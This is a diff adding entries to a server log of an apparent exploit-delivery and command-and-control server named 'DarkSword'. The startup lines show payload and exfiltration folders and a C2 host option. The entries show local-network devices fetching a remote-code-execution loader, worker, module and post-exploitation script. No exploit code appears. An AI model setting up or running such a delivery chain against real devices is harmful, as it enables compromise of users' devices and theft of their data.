@@ -85,3 +85,55 @@
 [2026-07-19 18:25:28] [REQUEST] "GET /rce_worker_18.4.js?1784456728944 HTTP/1.1" 200 -
 [2026-07-19 18:25:28] GET /rce_module.js?1784456729075 from 192.168.31.198 (device: 1c0b5f56ecd02a385d48ee057e0fca67)
 [2026-07-19 18:25:28] [REQUEST] "GET /rce_module.js?1784456729075 HTTP/1.1" 200 -
+[2026-07-21 08:12:51] DarkSword server listening on http://0.0.0.0:8080
+[2026-07-21 08:12:51] Payloads: D:\wwwroot\darksword\payloads
+[2026-07-21 08:12:51] Access: http://localhost:8080/ or http://<IP>:8080/
+[2026-07-21 08:12:51] rce_loader localHost: auto from each request Host (http). Use --c2-host https://... if you need HTTPS or a public URL.
+[2026-07-21 08:12:51] Exfil data saved to: D:\wwwroot\darksword\exfil
+[2026-07-21 08:12:51] Logs saved to: D:\wwwroot\darksword\server.log
+[2026-07-21 09:30:40] GET / from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:40] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-21 09:30:40] GET /frame.html?0.29781860431806617 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:40] [REQUEST] "GET /frame.html?0.29781860431806617 HTTP/1.1" 200 -
+[2026-07-21 09:30:40] GET /rce_loader.js?1784597443024 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:40] [REQUEST] "GET /rce_loader.js?1784597443024 HTTP/1.1" 200 -
+[2026-07-21 09:30:40] GET /rce_worker_18.4.js?1784597443046 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:40] [REQUEST] "GET /rce_worker_18.4.js?1784597443046 HTTP/1.1" 200 -
+[2026-07-21 09:30:40] GET /rce_module.js?1784597443076 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:40] [REQUEST] "GET /rce_module.js?1784597443076 HTTP/1.1" 200 -
+[2026-07-21 09:30:40] GET /apple-touch-icon-precomposed.png from 192.168.31.198 (device: 7bae84669d01a8337b40be672f8ba3d3)
+[2026-07-21 09:30:40] [REQUEST] code 404, message File not found
+[2026-07-21 09:30:40] [REQUEST] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 -
+[2026-07-21 09:30:40] GET /apple-touch-icon.png from 192.168.31.198 (device: 7bae84669d01a8337b40be672f8ba3d3)
+[2026-07-21 09:30:40] [REQUEST] code 404, message File not found
+[2026-07-21 09:30:40] [REQUEST] "GET /apple-touch-icon.png HTTP/1.1" 404 -
+[2026-07-21 09:30:40] GET /favicon.ico from 192.168.31.198 (device: 7bae84669d01a8337b40be672f8ba3d3)
+[2026-07-21 09:30:40] [REQUEST] code 404, message File not found
+[2026-07-21 09:30:43] GET /post_exploit.js?1784597446118 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:43] [REQUEST] "GET /post_exploit.js?1784597446118 HTTP/1.1" 200 -
+[2026-07-21 09:30:56] GET / from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:56] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-21 09:30:56] GET /frame.html?0.6259751804291784 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:56] [REQUEST] "GET /frame.html?0.6259751804291784 HTTP/1.1" 200 -
+[2026-07-21 09:30:56] GET /rce_loader.js?1784597458949 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:56] [REQUEST] "GET /rce_loader.js?1784597458949 HTTP/1.1" 200 -
+[2026-07-21 09:30:56] GET /rce_worker_18.4.js?1784597458967 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:56] [REQUEST] "GET /rce_worker_18.4.js?1784597458967 HTTP/1.1" 200 -
+[2026-07-21 09:30:56] GET /rce_module.js?1784597458996 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:56] [REQUEST] "GET /rce_module.js?1784597458996 HTTP/1.1" 200 -
+[2026-07-21 09:30:59] GET /post_exploit.js?1784597462109 from 192.168.31.198 (device: 9be163ce38a0f4a1476dd838393fe936)
+[2026-07-21 09:30:59] [REQUEST] "GET /post_exploit.js?1784597462109 HTTP/1.1" 200 -
+[2026-07-21 09:33:36] GET / from 192.168.31.85 (device: 58935adf2e03420153f05eb8436201a5)
+[2026-07-21 09:33:36] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-21 09:33:36] GET /frame.html?0.1451092300470963 from 192.168.31.85 (device: 58935adf2e03420153f05eb8436201a5)
+[2026-07-21 09:33:36] [REQUEST] "GET /frame.html?0.1451092300470963 HTTP/1.1" 200 -
+[2026-07-21 09:33:36] GET /rce_loader.js?1784597619456 from 192.168.31.85 (device: 58935adf2e03420153f05eb8436201a5)
+[2026-07-21 09:33:36] [REQUEST] "GET /rce_loader.js?1784597619456 HTTP/1.1" 200 -
+[2026-07-21 09:33:36] GET /rce_worker_18.4.js?1784597619481 from 192.168.31.85 (device: 58935adf2e03420153f05eb8436201a5)
+[2026-07-21 09:33:36] [REQUEST] "GET /rce_worker_18.4.js?1784597619481 HTTP/1.1" 200 -
+[2026-07-21 09:33:37] GET /rce_module.js?1784597619511 from 192.168.31.85 (device: 58935adf2e03420153f05eb8436201a5)
+[2026-07-21 09:33:37] [REQUEST] "GET /rce_module.js?1784597619511 HTTP/1.1" 200 -
+[2026-07-21 09:33:37] GET /favicon.ico from 192.168.31.85 (device: 58935adf2e03420153f05eb8436201a5)
+[2026-07-21 09:33:37] [REQUEST] code 404, message File not found
+[2026-07-21 09:33:40] GET /post_exploit.js?1784597622552 from 192.168.31.85 (device: 58935adf2e03420153f05eb8436201a5)
+[2026-07-21 09:33:40] [REQUEST] "GET /post_exploit.js?1784597622552 HTTP/1.1" 200 -
